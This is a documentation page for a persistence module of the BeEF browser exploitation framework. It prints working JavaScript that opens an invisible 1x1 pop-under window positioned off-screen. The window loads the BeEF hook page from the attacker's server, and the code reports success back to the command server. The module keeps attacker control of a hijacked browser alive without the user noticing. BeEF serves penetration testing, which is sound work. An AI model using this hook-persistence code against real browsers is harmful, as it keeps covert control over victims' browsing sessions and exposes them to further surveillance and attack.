##Summary

* **Description**: This module creates a new discrete pop under window with the BeEF hook included. Another browser node will be added to the hooked browser tree.
* **Authors**: ethicalhack3r
* **Browsers**: All (User is notified)
* **Parameters** : No parameters needed
* [Code](https://github.com/beefproject/beef/tree/master/modules/persistence/popunder_window)

##Internal Working

Basic and efficient :

```javascript
    var result = "Pop-under window successfully created!";
    window.open('http://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html','popunder','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
    window.focus();	
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
```

##Feedback

* It works